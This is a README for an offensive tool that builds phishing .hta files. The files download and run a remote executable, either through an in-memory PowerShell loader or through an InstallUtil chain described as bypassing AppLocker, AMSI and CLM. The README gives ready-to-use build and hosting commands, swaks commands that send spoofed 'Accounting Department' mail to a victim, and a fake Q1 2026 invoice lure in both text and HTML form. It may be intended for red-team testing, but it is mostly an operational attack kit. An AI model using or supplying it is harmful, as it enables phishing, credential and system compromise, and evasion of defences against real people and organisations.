# hta

Phishing `.hta` generator. Two execution chains:

- **PowerShell Reflection.Load** (default) — in-memory .NET loader, no disk write
- **InstallUtil** (`--installutil`) — drops .exe to `%TEMP%`, runs `InstallUtil.exe /U` (AppLocker/AMSI/CLM bypass; pair with the `installutil/` loader)

## Example

```bash
# PowerShell Reflection.Load — pair with loader/ output
python3 build_hta.py --url http://192.168.x.x/loader.exe

# InstallUtil chain — pair with installutil/ output
python3 build_hta.py --url http://192.168.x.x/Update.exe --installutil

# x86
python3 build_hta.py --url http://192.168.x.x/loader.exe --x86
```

Host the .exe and the .hta:

```bash
python3 -m http.server 80
```

## Deliver via email (swaks)

Host the `.hta` yourself and drop a naked link in the body — most mail clients auto-linkify it.

```bash
swaks \
  --to victim@corp.local \
  --from "Accounting Department <accounting@supplier.com>" \
  --server 192.168.x.x:25 \
  --header "Subject: Invoice Q1 2026" \
  --body @body.txt
```

Attachment alternative (HTA as `.hta` attachment — often blocked by mail gateways):

```bash
swaks \
  --to victim@corp.local \
  --from "Accounting Department <accounting@supplier.com>" \
  --server 192.168.x.x:25 \
  --header "Subject: Invoice Q1 2026" \
  --body @body.txt \
  --attach @Invoice.hta \
  --attach-type application/hta \
  --attach-name Invoice.hta
```

### Sample `body.txt` (link mode)

```text
Hello,

Please find the invoice for Q1 2026 available for download at the link below:

http://192.168.x.x/Invoice.hta

Kindly review and process the payment within 14 days.
Let me know if you have any questions.

Best regards,
Accounting Department
```

## HTML snippet (embed the HTA link in a webpage or HTML mail body)

```html
<p>Hello,</p>
<p>Please find the invoice for Q1 2026 available for download at the link below:</p>
<p><a href="http://192.168.x.x/Invoice.hta">Invoice_Q1_2026.hta</a></p>
<p>Kindly review and process the payment within 14 days.</p>
<p>Best regards,<br>Accounting Department</p>
```
